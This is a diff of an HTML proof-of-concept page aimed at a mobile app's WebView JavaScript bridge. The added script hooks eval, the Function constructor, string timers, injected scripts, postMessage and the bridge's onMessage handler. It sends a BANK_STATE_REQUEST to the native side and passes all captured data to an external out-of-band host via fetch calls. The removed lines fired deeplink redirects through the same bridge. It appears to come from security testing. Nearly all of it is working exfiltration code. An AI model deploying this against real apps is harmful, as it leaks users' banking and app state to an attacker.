@@ -1,30 +1,84 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// Use OPEN_LINK with DEEPLINK type to trigger internal app actions
-// These internal deeplinks might expose data or perform privileged actions
+// Hook ALL possible ways native can send response back to page
+var captured = [];
 
-var deeplinks = [
+// Hook eval
+var origEval = window.eval;
+window.eval = function(code) {
+  captured.push({method:"eval", code:String(code).substring(0,2000)});
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-eval?" + encodeURIComponent(String(code).substring(0,2000)));
+  return origEval.call(window, code);
+};
 
-  "ybapp://deeplink/redirect?url=https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/deeplink-redirect",
-];
+// Hook Function constructor
+var origFunction = Function;
+window.Function = function() {
+  var args = Array.from(arguments);
+  captured.push({method:"Function", args:JSON.stringify(args).substring(0,2000)});
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-function?" + encodeURIComponent(JSON.stringify(args).substring(0,2000)));
+  return origFunction.apply(this, arguments);
+};
 
-deeplinks.forEach(function(dl, i) {
-  setTimeout(function(){
-    window.__plusSDKMobileCompat.onMessage(JSON.stringify({
-      type: "OPEN_LINK",
-      trackId: "dl" + i,
-      payload: {
-        url: dl,
-        urlType: "DEEPLINK",
-        openType: "IN",
-        needAuth: false
+// Hook setTimeout/setInterval with string args
+var origSetTimeout = window.setTimeout;
+window.setTimeout = function(fn) {
+  if (typeof fn === 'string') {
+    captured.push({method:"setTimeout", code:fn.substring(0,2000)});
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-timeout?" + encodeURIComponent(fn.substring(0,2000)));
+  }
+  return origSetTimeout.apply(window, arguments);
+};
+
+// Monitor script injections
+var obs = new MutationObserver(function(mutations) {
+  mutations.forEach(function(m) {
+    m.addedNodes.forEach(function(n) {
+      if (n.tagName === 'SCRIPT') {
+        var content = n.src || n.textContent;
+        captured.push({method:"script-inject", content:String(content).substring(0,2000)});
+        fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-script?" + encodeURIComponent(String(content).substring(0,2000)));
       }
-    }));
-  }, i * 500);
+    });
+  });
+});
+obs.observe(document.documentElement, {childList:true, subtree:true});
+
+// Listen for postMessage
+window.addEventListener("message", function(e) {
+  captured.push({method:"postMessage", data:JSON.stringify(e.data).substring(0,2000)});
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-postmsg?" + encodeURIComponent(JSON.stringify(e.data).substring(0,2000)));
 });
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/deeplinks-sent?count=" + deeplinks.length);
+// Override __plusSDKMobileCompat.onMessage to catch incoming
+var origOnMsg = window.__plusSDKMobileCompat.onMessage;
+Object.defineProperty(window.__plusSDKMobileCompat, 'onMessage', {
+  set: function(fn) {
+    origOnMsg = fn;
+  },
+  get: function() {
+    return function(data) {
+      captured.push({method:"onMessage-incoming", data:String(data).substring(0,2000)});
+      fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-incoming?" + encodeURIComponent(String(data).substring(0,2000)));
+      if (origOnMsg) origOnMsg(data);
+    };
+  }
+});
+
+// NOW send BANK_STATE_REQUEST
+window.__plusSDKMobileCompat.onMessage(JSON.stringify({
+  type: "BANK_STATE_REQUEST",
+  trackId: "bank1",
+  payload: {}
+}));
+
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-state-sent");
+
+// Report after 8s
+setTimeout(function(){
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-captured?" + encodeURIComponent(JSON.stringify(captured)));
+}, 8000);
 </script>
 </body>
 </html>
